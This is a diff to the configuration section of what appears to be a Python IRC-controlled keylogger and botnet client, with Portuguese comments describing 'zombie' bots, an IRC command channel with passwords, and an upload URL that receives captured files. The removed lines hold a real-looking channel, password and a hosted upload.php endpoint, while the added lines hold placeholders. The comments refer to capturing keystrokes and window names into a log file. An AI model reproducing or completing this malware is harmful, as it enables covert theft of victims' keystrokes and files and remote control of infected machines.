@@ -34,13 +34,13 @@ import threading                                  # Funcao onKey(event)
 # --------------------------------------------------------------------------------------------------------------------#
 
 ircServer= "chat.freenode.net"                             # Endereco do servidor IRC.
-ircChanne= "#amarula4242"                                  # Canal ao qual o Zumbi ira se conectar.
-ircPwdCha= "@nolimits42"                                   # Password do canal, caso nao haja, deixar em branco.
+ircChanne= "#seucanalaqui"                                 # Canal ao qual o Zumbi ira se conectar.
+ircPwdCha= "senhadocanal"                                  # Password do canal, caso nao haja, deixar em branco.
 botAdmi= "Papa Father"                                     # Nome que os Zumbis usarao para chamar voce (n. obrigatorio)
 botPass= "raise"                                           # Password para se conectar aos bots no canal
-urlUpload = "http://cardinal-restaurant.000webhostapp.com/upload.php"                # Array PHP que ira receber os arquivos via upload
+urlUpload = "http://seusite.com/upload.php"                # Array PHP que ira receber os arquivos via upload
 urlStrip = urlUpload.strip('http:upload.php')              # Exibe a URL do dos arquivos upados
-ldir = os.getcwd()+'\storage'                                      # Pasta onde sera salvo o arquivo de log local no cliente
+ldir = os.getcwd()+'\storage'                              # Pasta onde sera salvo o arquivo de log local no cliente
 window = None                                              # Funcao onKey(event) para capturar o nome da janela
 data = ''                                                  # Funcao onKey(event) para tratar os dados capturados
 head = ''                                                  # Para definir o cabecalho da janela capturada no log.txt
